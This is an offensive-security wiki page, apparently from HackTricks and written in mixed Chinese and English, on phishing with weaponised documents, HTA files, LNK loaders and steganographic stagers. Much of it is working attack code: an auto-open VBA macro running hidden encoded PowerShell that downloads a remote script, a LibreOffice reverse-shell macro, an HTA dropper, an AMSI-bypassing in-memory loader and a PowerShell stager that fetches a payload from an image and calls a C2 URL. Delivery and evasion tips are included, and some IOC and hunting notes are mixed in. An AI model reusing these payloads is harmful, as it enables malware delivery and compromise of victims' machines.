# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word 在打开文件之前会执行文件数据验证。数据验证以数据结构识别的形式进行，并基于 OfficeOpenXML standard。如果在数据结构识别过程中发生任何错误，正在分析的文件将不会被打开。

通常，包含 macros 的 Word 文件使用 `.docm` 扩展名。然而，可以通过更改文件扩展名来重命名文件，同时仍然保留其宏执行能力。\
例如，RTF 文件按设计不支持 macros，但被重命名为 RTF 的 DOCM 文件会被 Microsoft Word 处理，并且能够执行宏。\
相同的内部机制和工作原理适用于 Microsoft Office Suite 的所有软件（Excel、PowerPoint 等）。

你可以使用以下命令来检查某些 Office 程序会执行哪些扩展名：
```bash
assoc | findstr /i "word excel powerp"
```
DOCX 文件引用远程模板（File –Options –Add-ins –Manage: Templates –Go），如果该模板包含 macros，也可以“执行” macros。

### External Image Load

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

可以使用 macros 从文档中运行任意代码。

#### Autoload functions

它们越常见，AV 检测到它们的概率就越高。

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 手动移除元数据

进入 **File > Info > Inspect Document > Inspect Document**，这会打开 Document Inspector。点击 **Inspect**，然后在 **Document Properties and Personal Information** 旁边点击 **Remove All**。

#### Doc 扩展名

完成后，选择 **Save as type** 下拉框，将格式从 **`.docx`** 改为 **Word 97-2003 `.doc`**。\
这样做是因为你 **不能把 macro's 保存到 `.docx` 里**，而且围绕支持 macro 的 **`.docm`** 扩展名有一定的 **stigma** **around**（例如，缩略图图标上会有一个巨大的 `!`，而且一些 web/email gateway 会直接阻止它们）。因此，这种 **legacy `.doc` 扩展名是最好的折中方案**。

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer 文档可以嵌入 Basic macros，并在文件打开时通过将 macro 绑定到 **Open Document** 事件来自动执行它们（Tools → Customize → Events → Open Document → Macro…）。一个简单的 reverse shell macro 看起来像：
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Note the doubled quotes (`""`) inside the string – LibreOffice Basic uses them to escape literal quotes, so payloads that end with `...==""")` keep both the inner command and the Shell argument balanced.

Delivery tips:

- Save as `.odt` and bind the macro to the document event so it fires immediately when opened.
- When emailing with `swaks`, use `--attach @resume.odt` (the `@` is required so the file bytes, not the filename string, are sent as the attachment). This is critical when abusing SMTP servers that accept arbitrary `RCPT TO` recipients without validation.

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## 强制 NTLM Authentication

有几种方法可以**远程**强制 NTLM authentication，例如，你可以在用户会访问的 email 或 HTML 中添加**不可见图片**（甚至是 HTTP MitM？）。或者把会**在打开文件夹时触发 authentication** 的**文件地址**发给受害者。

**请在以下页面查看这些想法以及更多内容：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

不要忘了，你不仅可以窃取 hash 或 authentication，还可以**执行 NTLM relay attacks**：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

高度有效的 campaign 会投递一个 ZIP，其中包含两个合法的诱饵文档（PDF/DOCX）和一个恶意 .lnk。其技巧在于，实际的 PowerShell loader 被存放在 ZIP 原始字节中一个唯一 marker 之后，而 .lnk 会将其切分出来并完全在内存中运行。

.lnk PowerShell one-liner 实现的典型流程：

1) 在常见路径中定位原始 ZIP：Desktop、Downloads、Documents、%TEMP%、%ProgramData% 以及当前 working directory 的父目录。
2) 读取 ZIP 字节并查找硬编码 marker（例如 xFIQCV）。marker 之后的所有内容就是嵌入的 PowerShell payload。
3) 将 ZIP 复制到 %ProgramData%，在那里解压，并打开诱饵 .docx 以显得合法。
4) 为当前进程绕过 AMSI：[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 对下一阶段进行去混淆（例如，移除所有 # 字符）并在内存中执行它。

用于切分并运行嵌入阶段的示例 PowerShell skeleton：
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads ending with links hosted under trusted PaaS domains.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Another recurring pattern is a **document-impersonating `.lnk`** that immediately opens a benign lure while it stages the real chain in the background.

Observed workflow:
1. The shortcut **masquerades as a PDF** and uses `conhost.exe` or a similar proxy to spawn an obfuscated PowerShell downloader.
2. The PowerShell fragments obvious tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) so naive detections looking for `iwr`, `gci`, `ren`, `cpi`, or `schtasks` miss the command.
3. The stager downloads the **decoy document first**, opens it for the victim, and then reconstructs the malicious files in the background.
4. Payloads may be written with **junk extensions** and then renamed by stripping filler characters, delaying the appearance of obvious `.exe` / `.cpl` artifacts.
5. Persistence is established with a **minute-based scheduled task** that launches a trusted host binary from a user-writable path.

Minimal hunting clues from this pattern:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
一个值得识别的有用 staging 布局是：
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 为什么第二阶段具有隐蔽性

在 Rapid7 案例研究中，计划任务反复从 `C:\Users\Public\` 启动 **`Fondue.exe`**。由于 **`APPWIZ.cpl`** 被放在它旁边并导出了 **`RunFODW`**，这个受信任的 Microsoft 二进制文件侧加载了攻击者的 CPL，而不是合法的系统副本。

然后该 CPL：
- 从 `C:\Windows\Tasks\editor.dat` 读取一个 **AES-256-CBC** blob
- 通过 **Windows CNG / `bcrypt.dll`** 对其解密
- 分配可执行内存并复制解密后的 shellcode
- 通过将 shellcode 指针作为 **`EnumUILanguagesW`** 的回调来间接执行它

最后这一步值得单独 hunting：恶意软件经常避免直接跳转 `((void(*)())buf)()`，而是滥用一个**合法的、接收回调的 WinAPI** 来转移执行。

这个 campaign 中解密后的 payload 是 **Donut** shellcode，随后它将最终 PE 完整映射到内存中，并在交出执行前修补当前进程中的 **AMSI/WLDP/ETW**。关于侧加载和内存驻留后处理的更深入说明，见：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

实用的 hunting 切入点：
- `.lnk` 启动 `powershell.exe` 或 `conhost.exe`，随后出现一个可见的诱饵文档。
- 短时间存在于 **`C:\Users\Public\`** 的下载，随后立刻从无意义扩展名重命名。
- 名称平淡的计划任务，例如 `GoogleErrorReport`，从 **用户可写目录** 执行。
- 受信任的二进制文件从同一非系统目录加载 **`.cpl` / `.dll`** 文件。
- Base64 文本 blob 写入 **`C:\Windows\Tasks\`** 下，然后被侧加载模块读取。

## 由图像中的隐写分隔 payload（PowerShell stager）

最近的 loader 链会投递一个混淆的 JavaScript/VBS，它会解码并运行一个 Base64 PowerShell stager。该 stager 会下载一张图像（通常是 GIF），其中包含一个以普通文本形式隐藏在唯一开始/结束标记之间的 Base64 编码 .NET DLL。脚本会搜索这些分隔符（在野外见过的例子：«<<sudo_png>> … <<sudo_odt>>>»），提取中间文本，Base64 解码为字节，内存中加载 assembly，并使用 C2 URL 调用一个已知入口方法。

工作流
- Stage 1：归档的 JS/VBS dropper → 解码内嵌 Base64 → 以 -nop -w hidden -ep bypass 启动 PowerShell stager。
- Stage 2：PowerShell stager → 下载图像，提取由标记分隔的 Base64，内存中加载 .NET DLL 并调用其方法（例如 VAI），传入 C2 URL 和选项。
- Stage 3：Loader 获取最终 payload，并通常通过 process hollowing 将其注入受信任的二进制文件（通常是 MSBuild.exe）。关于 process hollowing 和 trusted utility proxy execution 的更多内容见此：

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

从图像中提取 DLL 并在内存中调用 .NET 方法的 PowerShell 示例：

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notes
- This is ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
- AMSI/ETW bypass and string deobfuscation are commonly applied before loading the assembly.
- Hunting: scan downloaded images for known delimiters; identify PowerShell accessing images and immediately decoding Base64 blobs.

另请参见 stego tools 和 carving techniques：

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

一个常见的初始阶段是：在压缩包内投递一个小型、强混淆的 `.js` 或 `.vbs` 文件。它的唯一目的是解码一个内嵌的 Base64 字符串，并使用 `-nop -w hidden -ep bypass` 启动 PowerShell，通过 HTTPS 引导下一阶段。

骨架逻辑（抽象）：
- 读取自身文件内容
- 在垃圾字符串之间定位一个 Base64 blob
- 解码为 ASCII PowerShell
- 通过 `wscript.exe`/`cscript.exe` 调用 `powershell.exe` 执行

Hunting cues
- 压缩的 JS/VBS 附件在命令行中带有 `-enc`/`FromBase64String` 并启动 `powershell.exe`。
- `wscript.exe` 从用户临时目录启动 `powershell.exe -nop -w hidden`。

## Windows files to steal NTLM hashes

查看关于 **places to steal NTLM creds** 的页面：

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
